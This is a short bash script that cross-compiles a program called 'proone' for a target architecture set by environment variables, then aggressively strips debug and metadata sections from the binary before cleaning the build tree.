#!/bin/bash
OUT="$PROONE_BIN_PREFIX.$PROONE_BIN_ARCH"

./configure --host="$PROONE_HOST" $PROONE_AM_CONF &&\
    make -j$(nproc) &&\
    cp -a src/proone "$OUT" &&\
    "$PROONE_HOST-strip" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr "$OUT" &&\
    make distclean
